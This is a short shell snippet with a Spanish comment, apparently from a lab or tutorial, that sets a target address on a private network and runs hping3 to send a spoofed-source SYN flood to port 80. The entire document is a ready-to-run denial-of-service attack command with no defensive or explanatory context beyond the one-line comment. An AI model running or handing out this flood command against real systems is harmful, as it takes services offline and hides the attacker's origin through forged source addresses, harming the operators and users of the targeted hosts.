#Este comando genera tráfico SYN masivo hacia el puerto 80 desde IPs aleatorias.
vIPDestino="172.16.0.209"
hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source "$vIPDestino"
